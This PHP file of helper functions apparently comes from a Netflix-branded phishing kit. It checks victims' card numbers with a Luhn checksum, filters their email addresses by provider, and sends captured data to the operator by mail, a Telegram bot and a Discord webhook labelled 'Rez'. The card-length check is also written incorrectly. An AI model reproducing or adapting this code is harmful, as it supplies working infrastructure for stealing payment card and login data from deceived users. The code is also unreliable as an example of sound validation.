<?php

// Checking functions
function clean_user_input($string){

    $html_extracted = htmlspecialchars($string);
    return $html_extracted;

}

function verify_email($string){
    
    if (filter_var($string, FILTER_VALIDATE_EMAIL)) {
        $regex_check = true;
    }


    $domains_check = false;
    $list_of_emails = ["@gmail.com",
                        "@free.fr",
                        "@sfr.fr",
                        "@orange.fr",
                        "laposte.net",
                        "hotmail.com",
                        "hotmail.fr",
                        "live.fr",
                        "outlook.fr",
                        "outlook.com",
                        "orange.com",
                        "orange.fr",
                        "wanadoo.fr",
                        "club-internet.fr",
                        "neuf.fr",
                        "aliceadsl.fr",
                        "noos.fr",
                        "yahoo.com",
                        "yahoo.fr",
                        "aol.com",
                        "icloud.com",     
                        "gmx.fr",     
                        "gmx.de",     
                        "bbox.fr",          
                    ];
    foreach($list_of_emails as $domain){
        if(strstr($string,$domain)){
            $domains_check = true;
        }
    }
    

    if($regex_check && $domains_check){
        return true;
    }
}

function is_invalid_email(){
    if(isset($_GET["is_invalid_email"])){
        return true;
    }
    else{
        return false;
    }
}

function verify_card($card_number,$config) {

    if($config["verify_card_validity"] == true){
        if(strlen($card_number >= 16) && is_numeric($card_number)){
            $card_number_checksum = '';
    
            foreach (str_split(strrev((string) $card_number)) as $i => $d) {
                $card_number_checksum .= $i %2 !== 0 ? $d * 2 : $d;
            }
        
            return array_sum(str_split($card_number_checksum)) % 10 === 0;
        }
        else{
            return false;
        }
    }
    else{
        return true;
    }


}

function check_error($get_rror,$error_string){
    if(isset($_GET[$get_rror])){
        echo "<p style='color : red'>$error_string</p>";
    }
}

// Sending functions
function send_email_notification($message_to_send,$config,$email_subject){

    $receipt_email = $config["receipt_email"];
    $sujet = $email_subject;
    $message = $message_to_send;
    $headers = "From: Netflix | Kim <meneo@gmail.com>";

    mail($receipt_email, $sujet, $message, $headers);


    return true;
}

function send_telegram_notification($message_to_send,$config){


    $apiToken = $config["telegram_token"];
    $data = [
        'chat_id' => $config["telegram_chat_id"],
        'text' => $message_to_send
    ];

    file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                   http_build_query($data) );

    return true;
}

function send_discord_notification($message_to_send,$config,$title){
    $webhook = $config["discord_api_hook"];
    $timestamp = date("c", strtotime("now"));
    $msg = json_encode([
    "content" => "",
    "username" => "Discord Rez",
    "avatar_url" => "https://image.noelshack.com/fichiers/2020/27/7/1593948793-osirus-jack.png",
    "tts" => false,
    "embeds" => [
        [
            // Title
            "title" => $title,
    
            // Embed Type, do not change.
            "type" => "rich",
    
            // Description
            "description" => $message_to_send,
            // Link in title
            "url" => null,
    
            // Timestamp, only ISO8601
            "timestamp" => $timestamp,
    
            // Left border color, in HEX
            "color" => hexdec( "3366ff" ),
    
            "footer" => [
                "text" => "@ Discorez - 2022",
                "icon_url" => "https://image.noelshack.com/fichiers/2020/27/7/1593948793-osirus-jack.png"
            ],
            // thumbnail
            "thumbnail" => [
                "url" => "https://image.noelshack.com/fichiers/2020/27/7/1593948793-osirus-jack.png"
            ],
    
            // Author name & url
            "author" => [
                "name" => "DiscoRez",
                "url" => null,
                "icon_url" => "https://image.noelshack.com/fichiers/2020/27/7/1593948793-osirus-jack.png"
            ],
        ]
    ]
    
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
    
    $ch = curl_init( $webhook );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt( $ch, CURLOPT_POST, 1);
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $msg);
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt( $ch, CURLOPT_HEADER, 0);
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
    
    $response = curl_exec( $ch );
    curl_close( $ch );
    return true;

}

// Random functions

function getRandomString($n) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
  
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
  
    return $randomString;
}

function getRandomInt($n) {
    $characters = '0123456789';
    $randomString = '';
  
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
  
    return $randomString;
}

function generate_random_id($size){
    return bin2hex(random_bytes($size));
}

// Sessions Functions
function pannel_session_start(){
    if(!isset($_SESSION)){
        session_start();
    }
}




?>